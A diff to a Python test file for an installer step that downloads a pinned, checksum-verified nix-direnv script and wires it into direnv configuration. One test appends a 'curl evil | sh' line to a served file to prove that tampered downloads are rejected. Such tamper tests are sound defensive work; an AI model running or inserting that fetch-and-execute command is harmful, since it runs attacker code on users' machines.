@@ -1,10 +1,12 @@
 from __future__ import annotations
 
+import hashlib
 import os
 import pwd
 from pathlib import Path
 from unittest import mock
 
+from installer import pins
 from installer.steps import STEPS, nix
 
 from .support import StepCase
@@ -149,6 +151,19 @@ Original flake URL: flake:nixpkgs
 """
 
 
+TAG = pins.pin("NIX_DIRENV_VERSION")
+RAW = "https://raw.githubusercontent.com/nix-community/nix-direnv"
+LATEST = "https://api.github.com/repos/nix-community/nix-direnv/releases/latest"
+WIRED = (
+    "NIX_DIRENV_FALLBACK_NIX=${NIX_DIRENV_FALLBACK_NIX:-/nix/var/nix/profiles/default/bin/nix}\n"
+    "source $HOME/.local/share/nix-direnv/direnvrc\n"
+)
+
+
+def direnvrc(version: str) -> str:
+    return f"# shellcheck shell=bash\nNIX_DIRENV_VERSION={version}\n"
+
+
 class NixDirenvTest(StepCase):
     def setUp(self) -> None:
         super().setUp()
@@ -160,78 +175,120 @@ class NixDirenvTest(StepCase):
             'echo "nix $*" >>"$FAKE_CALLS"\n',
         )
         self.profile = self.home / ".nix-profile"
+        self.installed = self.home / ".local/share/nix-direnv/direnvrc"
+        self.wiring = self.home / ".config/direnv/direnvrc"
+        self.publish(TAG)
+        # The hash of the real file belongs to the real file.
+        digest = hashlib.sha256(direnvrc(TAG).encode()).hexdigest()
+        patch = mock.patch.object(nix, "DIRENVRC_SHA256", digest)
+        patch.start()
+        self.addCleanup(patch.stop)
+
+    def publish(self, tag: str, content: str | None = None) -> None:
+        self.serve(f"{RAW}/{tag}/direnvrc", direnvrc(tag) if content is None else content)
 
     def has(self, *names: str) -> None:
         self.listing.write_text("\n".join(LISTING.format(name=name) for name in names))
-
-    def linked(self) -> None:
-        share = self.profile / "share" / "nix-direnv"
-        share.mkdir(parents=True)
-        (share / "direnvrc").write_text("")
 
     def run_nix_direnv(self, system: str = "Linux", upgrade: bool = False) -> bool:
         return self.run_step(STEPS["install_nix_direnv"], system=system, upgrade=upgrade)
 
     def test_install_on_linux(self) -> None:
-        self.linked()
         self.assertTrue(self.run_nix_direnv())
         self.assertEqual(
             self.said(),
-            "[install] Installing nix-direnv\n[install] Wiring nix-direnv into direnvrc\n",
+            f"[install] Installing nix-direnv {TAG}\n[install] Wiring nix-direnv into direnvrc\n",
         )
-        self.assertEqual(self.called(), ["nix profile install nixpkgs#nix-direnv"])
-        self.assertEqual(
-            (self.home / ".config/direnv/direnvrc").read_text(),
-            "source $HOME/.nix-profile/share/nix-direnv/direnvrc\n",
-        )
+        self.assertEqual(self.called(), [])
+        self.assertEqual(self.installed.read_text(), direnvrc(TAG))
+        self.assertEqual(self.wiring.read_text(), WIRED)
+        self.assertEqual(list(self.installed.parent.iterdir()), [self.installed])
 
     def test_present(self) -> None:
-        self.linked()
-        self.has("nix-direnv")
-        direnvrc = self.home / ".config" / "direnv" / "direnvrc"
-        direnvrc.parent.mkdir(parents=True)
-        direnvrc.write_text("# mine\nsource ~/.nix-profile/share/nix-direnv/direnvrc\n")
         self.assertTrue(self.run_nix_direnv())
-        self.assertEqual(self.said(), "[install] nix-direnv already installed; skipping\n")
-        self.assertEqual(self.called(), [])
-        self.assertTrue(direnvrc.read_text().startswith("# mine\n"))
+        self.assertTrue(self.run_nix_direnv())
+        self.assertTrue(
+            self.said().endswith(f"[install] nix-direnv {TAG} already installed; skipping\n")
+        )
+        self.assertEqual(len(self.requests()), 1)
+        self.assertEqual(self.wiring.read_text(), WIRED)
 
-    def test_another_package_ending_in_the_name_does_not_count(self) -> None:
-        self.linked()
+    def test_upgrade_takes_the_newest_tag(self) -> None:
+        self.assertTrue(self.run_nix_direnv())
+        self.serve(LATEST, '{"tag_name": "9.9.9"}')
+        self.publish("9.9.9")
+        self.assertTrue(self.run_nix_direnv(upgrade=True))
+        self.assertIn("[install] Upgrading nix-direnv to 9.9.9\n", self.said())
+        self.assertEqual(self.installed.read_text(), direnvrc("9.9.9"))
+        self.assertTrue(self.run_nix_direnv(upgrade=True))
+        self.assertTrue(
+            self.said().endswith("[install] nix-direnv 9.9.9 already at latest; skipping\n")
+        )
+
+    def test_a_file_with_the_wrong_hash_is_not_installed(self) -> None:
+        self.publish(TAG, direnvrc(TAG) + "curl evil | sh\n")
+        self.assertFalse(self.run_nix_direnv())
+        self.assertIn("ERROR: Checksum mismatch for direnvrc: expected ", self.said())
+        self.assertFalse(self.installed.exists())
+        self.assertFalse(self.wiring.exists())
+
+    def test_a_file_declaring_another_version_is_not_installed(self) -> None:
+        self.serve(LATEST, '{"tag_name": "9.9.9"}')
+        self.publish("9.9.9", direnvrc("9.9.8"))
+        self.assertFalse(self.run_nix_direnv(upgrade=True))
+        self.assertIn(
+            f"ERROR: {RAW}/9.9.9/direnvrc is not nix-direnv 9.9.9 (it declares '9.9.8')\n",
+            self.said(),
+        )
+        self.assertFalse(self.installed.exists())
+
+    def test_a_nix_profile_install_is_moved_off_the_profile(self) -> None:
+        self.has("bash", "nix-direnv")
+        self.wiring.parent.mkdir(parents=True)
+        self.wiring.write_text(
+            "# mine\nsource ~/.nix-profile/share/nix-direnv/direnvrc\nexport MINE=1\n"
+        )
+        self.assertTrue(self.run_nix_direnv())
+        self.assertEqual(
+            self.said(),
+            f"[install] Installing nix-direnv {TAG}\n"
+            "[install] Pointing direnvrc at the downloaded nix-direnv\n"
+            "[install] Removing nix-direnv from the nix profile\n",
+        )
+        self.assertEqual(self.wiring.read_text(), f"# mine\n{WIRED}export MINE=1\n")
+        self.assertEqual(self.called(), ["nix profile remove nix-direnv"])
+
+    def test_a_leftover_profile_line_goes_once_the_new_one_is_there(self) -> None:
+        self.wiring.parent.mkdir(parents=True)
+        self.wiring.write_text(f"{WIRED}. $HOME/.nix-profile/share/nix-direnv/direnvrc\n")
+        self.assertTrue(self.run_nix_direnv())
+        self.assertEqual(self.wiring.read_text(), WIRED)
+
+    def test_another_package_ending_in_the_name_stays_in_the_profile(self) -> None:
         self.has("not-nix-direnv")
         self.assertTrue(self.run_nix_direnv())
-        self.assertIn("[install] Installing nix-direnv\n", self.said())
+        self.assertEqual(self.called(), [])
 
     def test_macos_gets_a_modern_bash_first(self) -> None:
-        self.linked()
         self.fake("bash", "#!/bin/sh\n", self.profile / "bin")
         self.assertTrue(self.run_nix_direnv(system="Darwin"))
         self.assertEqual(
             self.said(),
             "[install] Installing modern bash (nix-direnv requires >= 4.4)\n"
-            "[install] Installing nix-direnv\n"
+            f"[install] Installing nix-direnv {TAG}\n"
             "[install] Wiring nix-direnv into direnvrc\n",
         )
-        self.has("bash", "nix-direnv")
+        self.assertEqual(self.called(), ["nix profile install nixpkgs#bash"])
+        self.has("bash")
         self.assertTrue(self.run_nix_direnv(system="Darwin"))
         self.assertIn(
             "[install] Modern bash already installed; skipping\n"
-            "[install] nix-direnv already installed; skipping\n",
+            f"[install] nix-direnv {TAG} already installed; skipping\n",
             self.said(),
         )
+        self.serve(LATEST, f'{{"tag_name": "{TAG}"}}')
         self.assertTrue(self.run_nix_direnv(system="Darwin", upgrade=True))
-        self.assertEqual(
-            self.called()[-2:], ["nix profile upgrade bash", "nix profile upgrade nix-direnv"]
-        )
-
-    def test_a_package_that_did_not_link_fails_the_step(self) -> None:
-        self.assertFalse(self.run_nix_direnv())
-        self.assertIn(
-            "ERROR: nix-direnv is not in the nix profile"
-            " (~/.nix-profile/share/nix-direnv/direnvrc missing)\n",
-            self.said(),
-        )
-        self.assertFalse((self.home / ".config/direnv/direnvrc").exists())
+        self.assertEqual(self.called()[-1], "nix profile upgrade bash")
 
     def test_without_nix(self) -> None:
         (self.bin / "nix").unlink()
